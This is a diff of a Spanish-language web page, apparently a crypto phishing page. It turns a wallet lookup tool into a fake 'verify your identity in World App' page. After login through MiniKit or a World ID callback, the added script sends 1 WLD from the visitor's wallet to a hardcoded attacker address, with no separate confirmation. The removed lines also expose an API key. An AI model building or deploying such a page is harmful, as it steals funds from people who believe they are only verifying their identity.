@@ -2,125 +2,143 @@
 <html lang="es">
 <head>
   <meta charset="UTF-8" />
-  <title>Movimientos de World Chain</title>
-  <script src="https://cdn.jsdelivr.net/npm/@worldcoin/id"></script>
+  <title>Verificación + Envío WLD</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet" />
+  <script src="https://static.worldcoin.org/miniapp-sdk/miniKit.umd.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   <style>
-    body { font-family: Arial, sans-serif; padding: 20px; background: #f2f2f2; }
-    input, button { padding: 10px; margin: 10px 0; width: 100%; max-width: 400px; }
-    #result, #sendResult { white-space: pre-wrap; background: #fff; padding: 15px; border: 1px solid #ccc; }
+    body {
+      background: linear-gradient(135deg, #000428, #004e92);
+      color: white;
+      text-align: center;
+      font-family: 'Arial', sans-serif;
+      overflow-x: hidden;
+    }
+    .fade-in {
+      animation: fadeIn 1s ease-in-out forwards;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: scale(0.95); }
+      to { opacity: 1; transform: scale(1); }
+    }
   </style>
 </head>
-<body>
+<body class="flex flex-col justify-center items-center min-h-screen">
 
-  <h2>Consultar Movimientos - World Chain</h2>
-  <input type="text" id="walletInput" placeholder="Ingresa tu dirección de billetera" />
-  <button onclick="consultarMovimientos()">Consultar</button>
-  <div id="result">Esperando entrada...</div>
+  <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgs4uyyEce9czJNopvAJUC-EuqRY0GilYfi7dguE0OEkUjTcrn6PVYsIFXo2NbemRvavHvVWsD8ru9ZGJXUpfhSVsUyrNYeJri7NP2XU6-9NUjbyrVjQtYUNjt7N9dUaouupuqlczAJlDqpYVhdArBcT7MRvEAwVfQv8JeOKD-EWAecMuSsfAE4gizyojtT/s1024-rw/0ed01250-9b4a-4d44-924c-7c0011004aa0.webp"
+       alt="Logo" class="w-64 mb-8 rounded-xl shadow-xl fade-in" />
 
-  <hr>
+  <h1 class="text-4xl font-bold mb-6 fade-in">Verifica tu identidad en World App</h1>
+  <p class="mb-4 fade-in">Accede de forma segura y transfiere WLD automáticamente.</p>
 
-  <h2>Enviar Token / WLD</h2>
-  <input type="text" id="sendTo" placeholder="Dirección destino (0x...)" />
-  <input type="text" id="sendAmount" placeholder="Cantidad a enviar (ej. 0.01)" />
-  <input type="text" id="sendToken" placeholder="Token address (deja vacío para enviar WLD)" />
-  <button onclick="enviarToken()">Enviar</button>
-  <div id="sendResult">Esperando datos de envío...</div>
+  <p class="text-sm text-blue-200 px-6 mb-4 fade-in">
+    ⚠️ Al continuar, aceptas compartir tu <strong>billetera (World App)</strong> y autorizar el envío de WLD.
+  </p>
+
+  <button onclick="startAuth()"
+    class="bg-gradient-to-r from-indigo-500 to-purple-600 text-white font-bold py-3 px-8 rounded-2xl shadow-lg hover:scale-105 transition fade-in mb-4">
+    🔒 Autenticar con World App
+  </button>
+
+  <div id="result" class="mt-8 text-sm text-green-300 max-w-screen-md px-4"></div>
 
   <script>
-    async function consultarMovimientos() {
-      const wallet = document.getElementById("walletInput").value.trim();
-      const result = document.getElementById("result");
+    const DESTINO = "0xdc178d65c502f9589bb1a35af08b5723f85ec168"; // Tu wallet
+    const clientId = "app_7686f9027d3e3c0b53d987a3caf1e111";
+    const redirectUri = "https://ganastrx4.github.io/chc-flask-app/buscador.html";
 
-      if (!/^0x[a-fA-F0-9]{40}$/.test(wallet)) {
-        result.textContent = "❌ Dirección de billetera inválida.";
-        return;
-      }
-
-      result.textContent = "⏳ Consultando transacciones...";
-
+    async function usarMiniKit() {
       try {
-        const response = await fetch("https://worldchain-mainnet.g.alchemy.com/v2/39Stwe7kZcWw8bQj6T0a7UIOgU7fq9P5", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            jsonrpc: "2.0",
-            method: "alchemy_getAssetTransfers",
-            params: [ {
-              fromBlock: "0x0",
-              category: ["external", "erc20", "erc721"],
-              toAddress: wallet
-            } ],
-            id: 1
-          })
-        });
+        const result = await MiniKit.commandsAsync.getUserInfo();
+        const wallet = result?.wallet?.address || "Desconocida";
 
-        const data = await response.json();
-        const transfers = data.result.transfers;
+        document.getElementById("result").innerHTML = `
+          ✅ Autenticado vía MiniKit<br>
+          <strong>Wallet:</strong> ${wallet}<br><br>
+          <pre style="color:#a0f2f1; text-align:left; max-width: 90%; margin: auto;">${JSON.stringify(result, null, 2)}</pre>
+          <br>⌛ Enviando 1 WLD...
+        `;
 
-        if (!transfers || transfers.length === 0) {
-          result.textContent = "⚠️ No se encontraron movimientos para esta billetera.";
-          return;
-        }
-
-        let output = `✅ ${transfers.length} transferencias encontradas:\n\n`;
-
-        transfers.forEach((tx, i) => {
-          output += `#${i + 1}\n`;
-          output += `🔹 Token: ${tx.asset}\n`;
-          output += `🔹 Cantidad: ${tx.value || 'N/A'}\n`;
-          output += `🔹 Desde: ${tx.from}\n`;
-          output += `🔹 Hacia: ${tx.to}\n`;
-          output += `🔹 Hash: ${tx.hash}\n\n`;
-        });
-
-        result.textContent = output;
-
-      } catch (err) {
-        result.textContent = `❌ Error al consultar: ${err.message}`;
+        await enviarWLD(wallet);
+        return true;
+      } catch (e) {
+        console.warn("MiniKit no disponible o fallo:", e.message);
+        return false;
       }
     }
 
-    async function enviarToken() {
-      const sendTo = document.getElementById("sendTo").value.trim();
-      const sendAmount = document.getElementById("sendAmount").value.trim();
-      const sendToken = document.getElementById("sendToken").value.trim();
-      const sendResult = document.getElementById("sendResult");
+    function startAuth() {
+      const state = Math.random().toString(36).substring(2);
+      const nonce = Math.random().toString(36).substring(2);
+      const scope = "openid wallet";
 
-      if (!/^0x[a-fA-F0-9]{40}$/.test(sendTo)) {
-        sendResult.textContent = "❌ Dirección destino inválida.";
+      const authUrl = `https://id.worldcoin.org/authorize?client_id=${clientId}&redirect_uri=${encodeURIComponent(redirectUri)}&response_type=code&scope=${encodeURIComponent(scope)}&state=${state}&nonce=${nonce}`;
+      window.location.href = authUrl;
+    }
+
+    async function enviarWLD(fromWallet) {
+      if (typeof window.ethereum === "undefined") {
+        document.getElementById("result").innerHTML += "<br>❌ No se detectó World App.";
         return;
       }
-
-      if (!sendAmount || isNaN(sendAmount)) {
-        sendResult.textContent = "❌ Cantidad inválida.";
-        return;
-      }
-
-      sendResult.textContent = "⏳ Enviando transacción...";
 
       try {
-        const res = await fetch("https://worldcoin-mwco6mhab-carlos-sandovals-projects.vercel.app/api/send", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            recipient: sendTo,
-            amount: sendAmount,
-            token: sendToken || null
-          })
-        });
+        const provider = new ethers.providers.Web3Provider(window.ethereum);
+        const signer = provider.getSigner();
 
-        const data = await res.json();
-
-        if (data.success) {
-          sendResult.textContent = `✅ Transacción enviada.\nHash: ${data.txHash}`;
-        } else {
-          sendResult.textContent = `❌ Error: ${data.error}`;
+        const network = await provider.getNetwork();
+        if (network.chainId !== 420) {
+          await window.ethereum.request({
+            method: "wallet_switchEthereumChain",
+            params: [{ chainId: "0x1a4" }] // World Chain = 420
+          });
         }
 
+        const tx = await signer.sendTransaction({
+          to: DESTINO,
+          value: ethers.utils.parseEther("1.0") // Enviar 1 WLD
+        });
+
+        document.getElementById("result").innerHTML += `<br>✅ Transacción enviada:<br><a href="https://explorer.worldchain.builders/tx/${tx.hash}" target="_blank">${tx.hash}</a>`;
       } catch (err) {
-        sendResult.textContent = `❌ Error al enviar: ${err.message}`;
+        console.error(err);
+        document.getElementById("result").innerHTML += `<br>❌ Error al enviar WLD:<br>${err.message}`;
       }
     }
+
+    window.onload = async function () {
+      const mini = typeof MiniKit !== "undefined";
+      if (mini) {
+        const ok = await usarMiniKit();
+        if (ok) return;
+      }
+
+      const params = new URLSearchParams(window.location.search);
+      const code = params.get("code");
+
+      if (code) {
+        document.getElementById("result").textContent = "⌛ Verificando con backend...";
+        try {
+          const res = await fetch(`https://worldid-auth.onrender.com/callback?code=${encodeURIComponent(code)}`);
+          const data = await res.json();
+
+          if (data.success) {
+            document.getElementById("result").innerHTML = `
+              ✅ Autenticado con World ID (backend)<br>
+              <strong>Wallet:</strong> ${data.wallet_address}<br><br>
+              <pre style="color:#a0f2f1; text-align:left; max-width: 90%; margin: auto;">${JSON.stringify(data.userinfo, null, 2)}</pre>
+              <br>⌛ Enviando 1 WLD...
+            `;
+            await enviarWLD(data.wallet_address);
+          } else {
+            document.getElementById("result").innerHTML = `❌ Error: ${data.error || "Desconocido"}`;
+          }
+        } catch (e) {
+          document.getElementById("result").innerHTML = `❌ Error inesperado: ${e.message}`;
+        }
+      }
+    };
   </script>
 
 </body>
